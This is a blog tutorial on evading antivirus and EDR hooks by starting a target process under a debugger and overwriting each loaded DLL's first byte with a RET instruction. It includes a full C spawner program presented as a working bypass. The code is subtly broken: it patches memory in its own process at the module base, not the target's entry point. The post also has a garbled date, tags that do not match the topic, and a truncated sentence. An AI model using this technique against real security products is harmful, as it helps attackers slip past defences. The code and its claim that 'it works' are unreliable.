---
title: "Patching DLL Entry Points to Bypass AVs/EDRs Hooks"
author: fortyfour
date: 2023-06-029 23:31
categories: [Evasion, Buffer Overflow]
tags: [binary exploitation, exploit, buffer overflow, remote shell, evasion, developement, networking, shellcode, assembly, x86, x86_64, linux, c]
image: /assets/img/media/protocols-header.jpg
---

Diving into the realm of evasion techniques as we uncover a powerful method to outsmart antivirus (AV) and endpoint detection and response (EDR) systems. Discover the art of patching DLL entry points, a specialized approach that allows you to bypass security hooks and maintain stealthy operations in targeted scenarios by manipulating DLL execution.

---

<details>
  <summary><strong>Table of Contents</strong></summary>
<div markdown="1">

- [Introduction](#introduction)
- [Understanding API Hooking and DLL Injection](#understanding-api-hooking-and-dll-injection)
- [Analyzing DLLs Loaded in a Process](#analyzing-dlls-loaded-in-a-process)
- [Controlling DLL Execution by Patching Entry Points](#controlling-dll-execution-by-patching-entry-points)
- [Understanding the `LOAD_DLL_DEBUG_INFO` Debug Event](#understanding-the-load_dll_debug_info-debug-event)
- [Creating a Debugging Environment](#creating-a-debugging-environment)
- [Patching the Entry Point](#patching-the-entry-point)
- [Demonstration](#demonstration)
- [Conclusion](#conclusion)

</div>
</details>

## Introduction

Many antivirus (AV) and endpoint detection and response (EDR) solutions heavily rely on user-mode API hooking to detect malicious behavior in real-time. By injecting a dynamic-link library (DLL) into user processes, these products can monitor and identify suspicious activities during runtime. In this article, we will explore the technique of patching DLL entry points to bypass AV/EDR hooks. For our demonstration, we will use a simple "hello world" printout on the `DLL_PROCESS_ATTACH` event, implemented in a DLL called *AV/EDR Simulated DLL* created using Visual Studio. We will simulate AV/EDR hooking by injecting this DLL, using a DLL Injector called *DLL Injector*, into an example program called *dummy_program.exe*. It's important to note that this technique can be applied to various other products, including actual AV/EDR software (kinda the entire point of this article).

> You do not have to know or understand how to create a DLL or DLL Injector to follow along with this article or how the `DLL_PROCESS_ATTACH` event works. However, if you are interested in learning more about these topics, I recommend checking out the following articles: (im still working on them lol)
{: .prompt-warning }

> All of the source code for this article is available on [GitHub](https://github.com/9xN/Patching-DLL-Entry-Points)
{: .prompt-info }

## Understanding API Hooking and DLL Injection

User-mode API hooking involves injecting a DLL into targeted processes to intercept and monitor system calls and events. This technique allows AV/EDR solutions to intercept and analyze the behavior of running processes. By examining the DLLs loaded into processes, we can gain insights into the hooking mechanism employed by AV/EDR solutions. To illustrate this, we will utilize Sysinternals' Process Explorer, a powerful tool for inspecting running processes and their associated DLLs. The expected output of this tool is that we should see our *AV/EDR Simulated DLL* loaded into the *dummy_program.exe* process.

## Analyzing DLLs Loaded in a Process

Let's take a closer look at the process named Dummy.exe using Process Explorer. By examining the lower pane of the tool, we can observe that the DLL named `aswhook.dll` has been loaded into the process at startup. This DLL is responsible for Avast's hooking functionality.

## Controlling DLL Execution by Patching Entry Points

Patching the entry point of a DLL is somewhat obsolete and useless once the DLL is loaded and its `DllMain()` function has already executed. To successfully bypass AV/EDR hooks, the entry point must be patched **before execution takes place**. To achieve this, we can create a separate "spawner" process that acts as a debugger for our target process. This approach allows us to intercept and manipulate the loading and execution of DLLs.

## Understanding the `LOAD_DLL_DEBUG_INFO` Debug Event

In the context of debugging, the `DEBUG_EVENT` structure provides essential information, with the `LOAD_DLL_DEBUG_INFO` event being particularly relevant for our purpose. This event is triggered when a DLL is loaded into the target process. By leveraging this debug event, we can halt the execution of the debuggee process before any code within the loaded DLL is executed.

## Creating a Debugging Environment

To establish a debugging environment, we can utilize the `CreateProcess()` function with the appropriate Process Creation Flags. By setting the flag to `DEBUG_PROCESS`, the calling thread will start and debug the new process, including any child processes created by it. This configuration allows us to receive all related debug events using the `WaitForDebugEvent` function.

## Patching the Entry Point

With our debugging environment in place, we can now patch the entry point of the DLL before it executes any code. The patching process involves rewriting the first byte of the DLL's entry point with the opcode `(BYTE) 0xc3`, representing the RET instruction. By doing so, we redirect the execution flow of the DLL, effectively bypassing the AV/EDR hooks.

# Demonstration

To showcase the effectiveness of patching DLL entry points, we will demonstrate the technique in action. By following the outlined steps, we can observe how the debugger intercepts the loading of a DLL in the target process and successfully patches its entry point. This manipulation ensures that the DLL's code is not executed, rendering the AV/EDR hooks ineffective:

```c
#include <stdio.h>
#include <windows.h>
#include <string>

// Function to patch the entry point of a DLL
void PatchEntryPoint(LPVOID moduleBase)
{
    BYTE patchByte = 0xC3; // Opcode for RET instruction
    DWORD oldProtect, dummy;

    // Change the protection of the first byte of the DLL's code
    VirtualProtect(moduleBase, 1, PAGE_EXECUTE_READWRITE, &oldProtect);

    // Patch the entry point with the RET instruction
    memcpy(moduleBase, &patchByte, sizeof(BYTE));

    // Restore the original protection
    VirtualProtect(moduleBase, 1, oldProtect, &dummy);
}

int main(int argc, char* argv[])
{
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    DEBUG_EVENT debugEvent;
    BOOL debugStatus;

    if (argc < 2) {
        printf("Usage: %s <Program Name>\n", argv[0]);
        return 1;
    }

    // Convert program name to wide character string
    std::string programName(argv[1]);
    int requiredSize = MultiByteToWideChar(CP_UTF8, 0, programName.c_str(), -1, NULL, 0);
    if (requiredSize == 0) {
        printf("Failed to convert program name to wide character string.\n");
        return 1;
    }
    wchar_t* wideProgramName = new wchar_t[requiredSize];
    if (MultiByteToWideChar(CP_UTF8, 0, programName.c_str(), -1, wideProgramName, requiredSize) == 0) {
        printf("Failed to convert program name to wide character string.\n");
        delete[] wideProgramName;
        return 1;
    }

    // Initialize the structures
    ZeroMemory(&si, sizeof(STARTUPINFO));
    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));

    si.cb = sizeof(STARTUPINFO);

    // Create the target process with DEBUG_PROCESS flag
    if (!CreateProcess(NULL, wideProgramName, NULL, NULL, FALSE, DEBUG_PROCESS, NULL, NULL, &si, &pi))
    {
        printf("Failed to create the target process.\n");
        delete[] wideProgramName;
        return 1;
    }

    delete[] wideProgramName;

    printf("Target process created. Waiting for debug events...\n");

    // Wait for debug events
    while (debugStatus = WaitForDebugEvent(&debugEvent, INFINITE))
    {
        if (debugEvent.dwDebugEventCode == LOAD_DLL_DEBUG_EVENT)
        {
            // Patch the entry point of the loaded DLL
            PatchEntryPoint(debugEvent.u.LoadDll.lpBaseOfDll);
            printf("Entry point patched for DLL loaded at address: 0x%p\n", debugEvent.u.LoadDll.lpBaseOfDll);
        }

        // Continue the debuggee process
        ContinueDebugEvent(debugEvent.dwProcessId, debugEvent.dwThreadId, DBG_CONTINUE);
    }

    // Close handles
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 0;
}
```
and when we run this...
![](/assets/img/media/dllpatching/patch_attempt1.png)
_DLL entry point patch attempt 1_

It works! it 
## Conclusion

Patching DLL entry points to bypass AV/EDR hooks provides an intriguing approach to evade detection and analysis by security solutions. By understanding the fundamentals of DLL injection, API hooking, and debugging, it becomes possible to manipulate the execution flow of loaded DLLs. This technique highlights the importance of continuous innovation and adaptation in the ever-evolving landscape of cybersecurity. However, it is crucial to emphasize the responsible use of such knowledge to ensure the overall security and integrity of systems.